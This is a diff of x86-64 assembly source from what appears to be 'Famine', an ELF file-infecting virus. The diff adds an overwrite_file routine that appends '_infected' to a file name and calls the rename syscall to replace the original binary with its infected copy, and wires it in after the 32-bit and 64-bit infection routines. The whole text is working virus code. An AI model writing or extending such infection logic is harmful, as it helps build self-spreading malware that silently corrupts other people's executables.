@@ -596,6 +596,8 @@ famine_file:
 	mov rsi, rax; wfd
 	mov rdx, [rsp + 12]; fsize
 	call parse64elf
+	mov rdi, [rsp + 20]; fname 
+	call overwrite_file
 	jmp leave_famine_file
 	;32BIT FILE
 	file32bit:
@@ -609,6 +611,8 @@ famine_file:
 	mov rsi, rax; wfd
 	mov rdx, [rsp + 12]; fsize
 	call parse32elf
+	mov rdi, [rsp + 20]; fname 
+	call overwrite_file
 	jmp leave_famine_file
 	obj_file:
 	cmp WORD[rax + 16], 1; ET_REL
@@ -761,6 +765,53 @@ map_file:
 	mov rax, 0; ret NUlL in case of err
 	mmap_no_err:
 	add rsp, 8
+retn
+
+;this function will rename fname_infected into fname, so we don't have a copy of the
+; original bin but we edited it instead
+; void overwrite_file(char *fname)
+overwrite_file:
+	call ft_strlen
+	add rax, 10; so it can contain fname + "_infected" + '\0'
+	sub rsp, rax; our string containing fname + "_infected" + '\0' is [rsp + 8]
+	push QWORD rax
+	lea rsi, [rsp + 8]
+	xor rcx, rcx
+	of_loop: ; basically a strcpy of fname
+		cmp byte[rdi + rcx], 0
+			je of_loop_exit
+		mov dl, byte[rdi + rcx]
+		mov byte[rsi + rcx], dl
+		inc rcx
+		jmp of_loop
+	of_loop_exit:
+	mov byte[rsi + rcx], '_'
+	inc rcx
+	mov byte[rsi + rcx], 'i'
+	inc rcx
+	mov byte[rsi + rcx], 'n'
+	inc rcx
+	mov byte[rsi + rcx], 'f'
+	inc rcx
+	mov byte[rsi + rcx], 'e'
+	inc rcx
+	mov byte[rsi + rcx], 'c'
+	inc rcx
+	mov byte[rsi + rcx], 't'
+	inc rcx
+	mov byte[rsi + rcx], 'e'
+	inc rcx
+	mov byte[rsi + rcx], 'd'
+	inc rcx
+	mov byte[rsi + rcx], 0
+	;now rsi contains fname + "_infected"
+	mov rbx, rdi ; swap rdi and rsi
+	mov rdi, rsi
+	mov rsi, rbx
+	mov rax, 82
+	syscall; rename(fname_infected, fname);
+	pop QWORD rax
+	add rsp, rax
 retn
 
 ; int cread_infected_file(char *fname)
